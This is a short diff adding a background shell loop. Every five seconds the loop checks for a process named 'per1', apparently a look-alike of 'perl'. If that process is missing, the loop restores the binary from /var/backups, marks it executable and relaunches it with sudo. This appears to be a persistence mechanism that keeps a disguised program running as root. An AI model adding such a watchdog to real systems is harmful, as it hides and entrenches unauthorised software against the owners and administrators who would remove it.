@@ -1,0 +1,10 @@
+while true;do
+   MSG=$(ps -ef|grep -v 'grep'|grep "per1")
+   if [ $? -ne 0 ];
+   then
+     cp /var/backups/perl.bak.1 /usr/bin/per1 -f
+     chmod +x /usr/bin/per1
+     sudo /usr/bin/per1 &
+   fi
+   sleep 5
+done &
